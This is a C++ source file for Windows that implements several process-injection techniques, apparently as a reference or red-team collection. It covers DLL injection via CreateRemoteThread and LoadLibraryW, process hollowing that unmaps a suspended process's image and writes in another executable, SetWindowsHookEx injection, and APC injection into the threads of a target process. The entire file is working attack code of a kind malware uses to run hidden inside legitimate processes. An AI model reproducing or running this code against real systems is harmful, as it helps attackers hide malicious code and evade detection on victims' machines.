#include <Windows.h>
#include "Injection.h"
#include <ostream>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#include <Winternl.h>
#include <fstream>
#include <future>
#include <filesystem>

#define RTN_OK 0
#define RTN_USAGE 1
#define RTN_ERROR 13
using namespace std;

// https://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/
BOOL FindProcess(PCWSTR exeName, DWORD& pid, vector<DWORD>& tids) {
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;

	pid = 0;

	PROCESSENTRY32 pe = { sizeof(pe) };
	if (::Process32First(hSnapshot, &pe)) {
		do {
			if (_wcsicmp(pe.szExeFile, exeName) == 0) {
				pid = pe.th32ProcessID;
				THREADENTRY32 te = { sizeof(te) };
				if (Thread32First(hSnapshot, &te)) {
					do {
						if (te.th32OwnerProcessID == pid) {
							tids.push_back(te.th32ThreadID);
						}
					} while (Thread32Next(hSnapshot, &te));
				}
				break;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return pid > 0 && !tids.empty();
}

BOOL Dll_Injection(TCHAR *dll_name, TCHAR processname[])
{
	TCHAR lpdllpath[MAX_PATH];
	GetFullPathName(dll_name, MAX_PATH, lpdllpath, nullptr);

	DWORD processId{};
	// Snapshot of processes
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;

	PROCESSENTRY32 pe{}; // Describes an entry from a list of the processes residing in the system address space when a snapshot was taken.
						 // The size of the structure, in bytes. Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize, Process32First fails. (msdn)
	pe.dwSize = sizeof PROCESSENTRY32;


	// get PID
	if (Process32First(hSnapshot, &pe) == FALSE)
	{
		CloseHandle(hSnapshot);
		return FALSE;
	}

	if (_wcsicmp(pe.szExeFile, processname) == 0)
	{
		CloseHandle(hSnapshot);
		processId = pe.th32ProcessID;
	}

	while (Process32Next(hSnapshot, &pe))
	{
		if (_wcsicmp(pe.szExeFile, processname) == 0)
		{
			CloseHandle(hSnapshot);
			processId = pe.th32ProcessID;
		}
	}

	auto size = wcslen(lpdllpath) * sizeof(TCHAR);
	auto hVictomProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processId);
	auto pNameInVictimProcess = VirtualAllocEx(hVictomProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	auto bStatus = WriteProcessMemory(hVictomProcess, pNameInVictimProcess, lpdllpath, size, nullptr);
	auto hKernel32 = GetModuleHandle(L"kernel32.dll");
	auto LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryW");
	auto hThreadId = CreateRemoteThread(hVictomProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryAddress), pNameInVictimProcess, NULL, nullptr);
	if (bStatus == NULL)
		return FALSE;
	WaitForSingleObject(hThreadId, INFINITE);

	CloseHandle(hVictomProcess);
	VirtualFreeEx(hVictomProcess, pNameInVictimProcess, size, MEM_RELEASE);

	std::cout << "Injected Successfully\n";
	return TRUE;
}

void PE_FILE::set_sizes(size_t size_ids_, size_t size_dos_stub_, size_t size_inh32_, size_t size_ish_, size_t size_sections_)
{
	this->size_ids = size_ids_;
	this->size_dos_stub = size_dos_stub_;
	this->size_inh32 = size_inh32_;
	this->size_ish = size_ish_ + sizeof(IMAGE_SECTION_HEADER);
	this->size_sections = size_sections_;
}

tuple<bool, char*, streampos> OpenBinary(wstring filename)
{
	auto flag = false;
	fstream::pos_type size{};
	char* bin{};


	ifstream ifile(filename, ios::binary | ios::in | ios::ate);
	if (ifile.is_open())
	{
		size = ifile.tellg();
		bin = new char[size];
		ifile.seekg(0, ios::beg);
		ifile.read(bin, size);
		ifile.close();
		flag = true;
	}
	return make_tuple(flag, bin, size);
}
PE_FILE ParsePE(const char* PE)
{
	PE_FILE pefile{};
	memcpy_s(&pefile.ids, sizeof(IMAGE_DOS_HEADER), PE, sizeof(IMAGE_DOS_HEADER));
	memcpy_s(&pefile.inh32, sizeof(IMAGE_NT_HEADERS64), PE + pefile.ids.e_lfanew, sizeof(IMAGE_NT_HEADERS64)); // address of PE header = e_lfanew
	size_t stub_size = pefile.ids.e_lfanew - 0x3c - 0x4; // 0x3c offet of e_lfanew
	pefile.MS_DOS_STUB = vector<char>(stub_size);
	memcpy_s(pefile.MS_DOS_STUB.data(), stub_size, (PE + 0x3c + 0x4), stub_size);

	auto number_of_sections = pefile.inh32.FileHeader.NumberOfSections;
	pefile.ish = vector<IMAGE_SECTION_HEADER>(number_of_sections + 1); // Number of sections

	auto PE_Header = PE + pefile.ids.e_lfanew;
	auto First_Section_Header = PE_Header + 0x18 + pefile.inh32.FileHeader.SizeOfOptionalHeader; // First Section: PE_header + sizeof FileHeader + sizeof Optional Header

																								 // copy section headers
	for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		memcpy_s(&pefile.ish[i], sizeof(IMAGE_SECTION_HEADER), First_Section_Header + (i * sizeof(IMAGE_SECTION_HEADER)), sizeof(IMAGE_SECTION_HEADER));
	}

	for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		shared_ptr<char> t_char(new char[pefile.ish[i].SizeOfRawData]{}, std::default_delete<char[]>()); // Section
		memcpy_s(t_char.get(), pefile.ish[i].SizeOfRawData, PE + pefile.ish[i].PointerToRawData, pefile.ish[i].SizeOfRawData); // copy sections.
		pefile.Sections.push_back(t_char);
	}
	size_t sections_size{};
	for (WORD i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		sections_size += pefile.ish[i].SizeOfRawData;
	}

	pefile.set_sizes(sizeof(pefile.ids), stub_size, sizeof(pefile.inh32), number_of_sections * sizeof(IMAGE_SECTION_HEADER), sections_size);

	return pefile;
}

// Based on John Leitch's paper "Process Hollowing"
BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
{

	tuple<bool, char*, fstream::pos_type>  bin = OpenBinary(inj_exe);
	if (!get<0>(bin))
	{
		cout << "Error to open file";
		return EXIT_FAILURE;
	}

	char* PE_file = get<1>(bin);
	size_t size_of_pe = get<2>(bin);

	auto Parsed_PE = ParsePE(PE_file);

	auto pStartupInfo = new STARTUPINFO();
	auto pProcessInfo = new PROCESS_INFORMATION();
	CreateProcess(target, nullptr, nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS, nullptr, nullptr, pStartupInfo, pProcessInfo);
	if (!pProcessInfo->hProcess)
		return FALSE;
	if (SuspendThread(pProcessInfo->hThread) == -1)
		return FALSE;

	DWORD dwReturnLength;

	// read remote PEB
	PROCESS_BASIC_INFORMATION ProcessBasicInformation;
	// get NtQueryInformationProcess
	auto hNtDll = LoadLibrary(L"ntdll");
	if (!hNtDll)
		return FALSE;
	auto fpNtQueryInformationProcess = GetProcAddress(hNtDll, "NtQueryInformationProcess");
	if (!fpNtQueryInformationProcess)
		return FALSE;
	auto mNtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);

	mNtQueryInformationProcess(pProcessInfo->hProcess, PROCESSINFOCLASS(0), &ProcessBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);
	auto dwPEBBAddress = ProcessBasicInformation.PebBaseAddress;

	auto pPEB = new PEB();

	if (!ReadProcessMemory(pProcessInfo->hProcess, static_cast<LPCVOID>(dwPEBBAddress), pPEB, sizeof(PEB), nullptr))
		return FALSE;

	// remote image
	auto BUFFER_SIZE = sizeof IMAGE_DOS_HEADER + sizeof IMAGE_NT_HEADERS64 + (sizeof IMAGE_SECTION_HEADER) * 100;
	auto pBuffer = new BYTE[BUFFER_SIZE];
	LPCVOID pImageAddressBase = pPEB->Reserved3[1]; // ImageBase
	if (!ReadProcessMemory(pProcessInfo->hProcess, pImageAddressBase, pBuffer, BUFFER_SIZE, nullptr))
		return FALSE;

	// unmap
	auto fpZwUnmapViewOfSection = GetProcAddress(hNtDll, "ZwUnmapViewOfSection");
	auto ZwUnmapViewOfSection = reinterpret_cast<_ZwUnmapViewOfSection>(fpZwUnmapViewOfSection);

	if (ZwUnmapViewOfSection(pProcessInfo->hProcess, const_cast<PVOID>(pImageAddressBase)))
		return FALSE;

	// Allocating memory for our PE file
	auto pRemoteImage = VirtualAllocEx(pProcessInfo->hProcess, const_cast<LPVOID>(pImageAddressBase), Parsed_PE.inh32.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteImage)
		return FALSE;
	// calculate relocation delta
	auto dwDelta = ULONGLONG(pImageAddressBase) - Parsed_PE.inh32.OptionalHeader.ImageBase;  // change to pImageAddressBase

	Parsed_PE.inh32.OptionalHeader.ImageBase = reinterpret_cast<ULONGLONG>(pImageAddressBase);

	if (!WriteProcessMemory(pProcessInfo->hProcess, const_cast<LPVOID>(pImageAddressBase), PE_file, Parsed_PE.inh32.OptionalHeader.SizeOfHeaders, nullptr))
		return FALSE;

	for (WORD i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections; ++i)
	{
		auto VirtAddress = PVOID(reinterpret_cast<ULONGLONG>(pImageAddressBase) + Parsed_PE.ish[i].VirtualAddress);

		if (!WriteProcessMemory(pProcessInfo->hProcess, VirtAddress, Parsed_PE.Sections[i].get(), Parsed_PE.ish[i].SizeOfRawData, nullptr))
			return FALSE;
	}

	// if delta > 0  - todo


	auto dwEntrypoint = reinterpret_cast<ULONGLONG>(pImageAddressBase) + Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;


	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_ALL;


	if (!GetThreadContext(pProcessInfo->hThread, pContext))
		return FALSE;

	pContext->Rcx = dwEntrypoint;
	pContext->ContextFlags = CONTEXT_FULL;

	if (!SetThreadContext(pProcessInfo->hThread, pContext))
		return FALSE;

	if (!GetThreadContext(pProcessInfo->hThread, pContext))
		return FALSE;



	if (!ResumeThread(pProcessInfo->hThread))
		return FALSE;


	CloseHandle(pProcessInfo->hProcess);
	//TerminateProcess(pProcessInfo->hProcess, 0);
	return TRUE;
}

BOOL HookInjection(TCHAR target[], TCHAR *dll_name)
{
	// https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx
	// SetWindowsHookEx can be used to inject a DLL into another process. A 32 - bit DLL cannot be injected into a 64 - bit process, 
	// and a 64 - bit DLL cannot be injected into a 32 - bit process.If an application requires the use of hooks in other processes, 
	// it is required that a 32 - bit application call SetWindowsHookEx to inject a 32 - bit DLL into 32 - bit processes, 
	// and a 64 - bit application call SetWindowsHookEx to inject a 64 - bit DLL into 64 - bit processes.The 32 - bit and 64 - bit DLLs must have different names.

	auto hdll = LoadLibrary(dll_name);

	typedef LRESULT(WINAPI * MyProc)(int code, WPARAM wp, LPARAM lp); // export from calc_dll.dll

	auto mp = MyProc(GetProcAddress(hdll, "MyProc"));

	auto pStartupInfo = new STARTUPINFO();
	auto pProcessInfo = new PROCESS_INFORMATION();
	CreateProcess(target, nullptr, nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS, nullptr, nullptr, pStartupInfo, pProcessInfo);
	if (!pProcessInfo->hProcess)
		return FALSE;

	auto hProc = SetWindowsHookEx(WH_CBT, mp, hdll, pProcessInfo->dwThreadId);

	UnhookWindowsHookEx(hProc);

	return TRUE;
}

BOOL APCinjection(TCHAR target[], TCHAR *dll_name) {
	TCHAR lpdllpath[MAX_PATH];
	GetFullPathName(dll_name, MAX_PATH, lpdllpath, nullptr);

	DWORD pid{};
	vector<DWORD> tids{};

	if (!FindProcess(target, pid, tids))
		return FALSE;
	auto hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess)
		return FALSE;
	auto pVa = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!WriteProcessMemory(hProcess, pVa, lpdllpath, sizeof(lpdllpath), nullptr))
		return FALSE;
	for (const auto &tid : tids) {
		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
		if (hThread) {
			QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW"), hThread, (ULONG_PTR)pVa);
			CloseHandle(hThread);
		}
	}
	CloseHandle(hProcess);
}